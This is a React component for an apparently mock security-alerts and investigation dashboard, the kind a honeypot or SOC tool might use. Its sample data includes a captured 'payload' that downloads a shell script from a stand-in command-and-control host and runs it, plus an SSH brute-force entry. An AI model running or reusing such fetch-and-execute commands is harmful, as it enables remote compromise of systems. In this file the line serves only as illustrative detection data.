import React, { useState } from 'react';
import './Alerts.css';        // Ensure you have the CSS from Step 1
import './InvestigationPage.css'; // Ensure you have the CSS from Step 2
import { 
  ShieldAlert, Search, XOctagon, CheckCircle, Filter, MoreHorizontal,
  Globe, Terminal, Clock, FileText, User, Cpu, ArrowLeft 
} from 'lucide-react';

// --- MOCK DATA (Enriched with details for the investigation view) ---
const MOCK_DATA = [
  {
    id: 'ALT-1024',
    severity: 'CRITICAL',
    title: 'RCE via Fake CI/CD Runner',
    source_ip: '45.12.89.123',
    service: 'Fake CI/CD Runner',
    timestamp: '12/11/2025, 18:15:22',
    status: 'OPEN',
    description: 'Detected payload containing /bin/sh injection sequence.',
    // Details for Investigation Page
    attacker: { country: 'Russia', asn: 'AS12345 HostNet', os: 'Linux (Ubuntu)' },
    payload: { content: 'wget http://malicous-c2.com/shell.sh -O /tmp/x; chmod +x /tmp/x; /tmp/x' },
    timeline: [
      { time: '18:15:22', desc: 'Payload Execution Detected' },
      { time: '18:15:20', desc: 'File Download (wget)' },
      { time: '18:15:15', desc: 'Port 8080 Connection Established' }
    ]
  },
  {
    id: 'ALT-1023',
    severity: 'HIGH',
    title: 'Multiple SSH Login Failures',
    source_ip: '192.168.201.29',
    service: 'Fake SSH',
    timestamp: '12/11/2025, 18:12:05',
    status: 'INVESTIGATING',
    description: '50+ failed login attempts within 1 minute using common root passwords.',
    attacker: { country: 'China', asn: 'AS9876 ChinaNet', os: 'Windows 10' },
    payload: { content: 'ssh root@host -p 22 (Brute Force)' },
    timeline: [
      { time: '18:12:05', desc: 'Account Lockout Triggered' },
      { time: '18:11:55', desc: 'Failed Login (root)' },
      { time: '18:11:00', desc: 'Connection Opened' }
    ]
  },
  // Add more mock items as needed...
];

// --- COMPONENT 1: THE LIST VIEW ---
const AlertsList = ({ alerts, onInvestigate }) => {
  return (
    <div className="dashboard-container">
      {/* Header Stats */}
      <div className="header-section">
        <h1 className="page-title"><span className="highlight">///</span> Security Alerts</h1>
        <div className="stats-grid">
          {[
            { label: 'Active Threats', val: '12', color: '#ef4444', icon: ShieldAlert },
            { label: 'Under Investigation', val: '4', color: '#f97316', icon: Search },
            { label: 'False Positives', val: '2', color: '#9ca3af', icon: XOctagon },
            { label: 'Resolved (24h)', val: '28', color: '#22c55e', icon: CheckCircle },
          ].map((stat, idx) => (
            <div key={idx} className="stat-card">
              <div><p className="stat-label">{stat.label}</p><p className="stat-value" style={{color: stat.color}}>{stat.val}</p></div>
              <stat.icon className="stat-icon" style={{color: stat.color}} />
            </div>
          ))}
        </div>
      </div>

      {/* Filter Bar */}
      <div className="filter-container">
        <div className="kql-wrapper">
          <span className="prompt-char">{'>'}</span>
          <input type="text" placeholder="Filter alerts..." className="kql-input" />
        </div>
        <button className="btn btn-primary">Refresh Data</button>
      </div>

      {/* The List */}
      <div className="alerts-list">
        {alerts.map((alert) => (
          <div key={alert.id} className="alert-card group">
            <div className="alert-content-wrapper">
              <div className={`severity-badge sev-${alert.severity}`}>{alert.severity}</div>
              <div className="alert-main">
                <div className="alert-header">
                  <h3 className="alert-title">{alert.title}</h3>
                  <span className="alert-id">{alert.id}</span>
                </div>
                <div className="alert-meta">
                  <span>SRC: <span className="meta-val">{alert.source_ip}</span></span>
                  <span>SVC: <span className="meta-svc">{alert.service}</span></span>
                  <span>TIME: {alert.timestamp}</span>
                </div>
              </div>
              <div className="alert-actions">
                <div className="status-indicator">
                  <div className={`status-dot ${alert.status}`}></div>
                  <span className="status-text">{alert.status}</span>
                </div>
                {/* THE INVESTIGATE BUTTON TRIGGERS THE SWITCH */}
                <button className="btn-small hover:bg-red-500/20 hover:border-red-500 hover:text-red-500 transition-all" 
                        onClick={() => onInvestigate(alert)}>
                  Investigate
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

// --- COMPONENT 2: THE INVESTIGATION DETAIL VIEW ---
const InvestigationView = ({ data, onBack }) => {
  if (!data) return null; // Safety check

  return (
    <div className="inv-container fade-in">
      {/* Header */}
      <div className="inv-header">
        <div className="inv-title-group">
          <button className="btn-icon" style={{marginRight: '1rem'}} onClick={onBack}>
            <ArrowLeft size={20} />
          </button>
          <div>
            <h1><ShieldAlert className="text-red-500" size={28} color="#ef4444" /> {data.title}</h1>
            <div className="inv-status">
              <span className="inv-id">{data.id}</span>
              <span style={{color: '#ef4444', fontWeight: 'bold'}}>{data.severity}</span>
              <span>•</span>
              <span>{data.status}</span>
            </div>
          </div>
        </div>
        <div className="action-bar">
          <button className="btn-danger">Block IP</button>
        </div>
      </div>

      <div className="inv-grid">
        {/* Left: Attacker */}
        <div className="inv-column">
          <div className="inv-card">
            <div className="card-header"><Globe size={16} /> Attacker Profile</div>
            <div className="card-body">
              <div className="geo-map-placeholder">[ {data.attacker.country} MAP ]</div>
              <div className="info-row"><span className="info-label">IP Address</span><span className="info-value" style={{color: '#60a5fa'}}>{data.source_ip}</span></div>
              <div className="info-row"><span className="info-label">Location</span><span className="info-value">{data.attacker.country}</span></div>
              <div className="info-row"><span className="info-label">ISP / ASN</span><span className="info-value">{data.attacker.asn}</span></div>
              <div className="info-row"><span className="info-label">OS</span><span className="info-value">{data.attacker.os}</span></div>
            </div>
          </div>
        </div>

        {/* Middle: Terminal */}
        <div className="inv-column">
          <div className="inv-card">
            <div className="card-header"><Terminal size={16} /> Captured Payload</div>
            <div className="card-body" style={{background: '#000'}}>
              <div className="terminal-window">
                <span className="terminal-line text-gray-500"># Intercepted Payload</span>
                <br/>
                <span className="terminal-line">
                  <span className="cmd-prompt">root@fsociety:~#</span>
                  <span className="cmd-input">{data.payload.content}</span>
                </span>
              </div>
            </div>
          </div>
        </div>

        {/* Right: Timeline */}
        <div className="inv-column">
          <div className="inv-card">
            <div className="card-header"><Clock size={16} /> Timeline</div>
            <div className="card-body">
              <div className="timeline">
                {data.timeline.map((event, idx) => (
                  <div key={idx} className="timeline-item">
                    <div className="timeline-dot"></div>
                    <div className="timeline-time">{event.time}</div>
                    <div className="timeline-desc">{event.desc}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// --- MAIN CONTROLLER COMPONENT ---
const Alerts = () => {
  // State to track which alert is selected (null = show list)
  const [selectedAlert, setSelectedAlert] = useState(null);

  return (
    <>
      {selectedAlert ? (
        // IF ALERT SELECTED: Show Investigation Page
        <InvestigationView 
          data={selectedAlert} 
          onBack={() => setSelectedAlert(null)} 
        />
      ) : (
        // ELSE: Show List Page
        <AlertsList 
          alerts={MOCK_DATA} 
          onInvestigate={(alert) => setSelectedAlert(alert)} 
        />
      )}
    </>
  );
};

export default Alerts;